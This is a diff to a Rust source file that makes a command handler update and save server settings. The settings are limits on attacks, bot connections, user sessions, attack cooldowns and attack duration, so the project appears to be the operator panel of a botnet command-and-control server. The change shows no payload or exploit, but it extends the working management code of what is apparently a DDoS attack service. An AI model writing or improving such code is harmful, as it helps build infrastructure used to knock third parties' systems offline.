@@ -506,13 +506,68 @@ pub async fn handle_config_command(client: &Arc<Client>, state: &Arc<AppState>, 
     let key = parts[1];
     let value = parts[2];
     
-    // This would need a way to update the Config struct and save it
-    // For now, we'll just acknowledge the command
-    client.write(format!("\x1b[38;5;82m[✓] Config updated: {} = {}\n\r", key, value).as_bytes()).await?;
-    
-    let audit_event = AuditLog::new(client.user.username.clone(), "UPDATE_CONFIG".to_string(), "SUCCESS".to_string())
-        .with_target(format!("{}={}", key, value));
-    let _ = log_audit_event(audit_event, &state.audit_file).await;
+    let mut config = state.config.write().await;
+    let mut updated = false;
+
+    match key {
+        "max_attacks" => {
+            if let Ok(v) = value.parse::<usize>() {
+                config.max_attacks = v;
+                updated = true;
+            }
+        }
+        "max_bot_connections" => {
+            if let Ok(v) = value.parse::<usize>() {
+                config.max_bot_connections = v;
+                updated = true;
+            }
+        }
+        "max_user_connections" => {
+            if let Ok(v) = value.parse::<usize>() {
+                config.max_user_connections = v;
+                updated = true;
+            }
+        }
+        "session_timeout_secs" => {
+            if let Ok(v) = value.parse::<u64>() {
+                config.session_timeout_secs = v;
+                updated = true;
+            }
+        }
+        "attack_cooldown_secs" => {
+            if let Ok(v) = value.parse::<u64>() {
+                config.attack_cooldown_secs = v;
+                updated = true;
+            }
+        }
+        "max_attack_duration_secs" => {
+            if let Ok(v) = value.parse::<u64>() {
+                config.max_attack_duration_secs = v;
+                updated = true;
+            }
+        }
+        "log_level" => {
+            config.log_level = value.to_string();
+            updated = true;
+        }
+        _ => {
+            client.write(format!("\x1b[38;5;196m[X] Unknown config key: {}\n\r", key).as_bytes()).await?;
+            return Ok(());
+        }
+    }
+
+    if updated {
+        if let Err(e) = config.save() {
+             client.write(format!("\x1b[38;5;196m[X] Failed to save config: {}\n\r", e).as_bytes()).await?;
+        } else {
+             client.write(format!("\x1b[38;5;82m[✓] Config updated: {} = {}\n\r", key, value).as_bytes()).await?;
+             let audit_event = AuditLog::new(client.user.username.clone(), "UPDATE_CONFIG".to_string(), "SUCCESS".to_string())
+                .with_target(format!("{}={}", key, value));
+             let _ = log_audit_event(audit_event, &state.audit_file).await;
+        }
+    } else {
+        client.write(format!("\x1b[38;5;196m[X] Invalid value for key: {}\n\r", key).as_bytes()).await?;
+    }
     
     Ok(())
 }
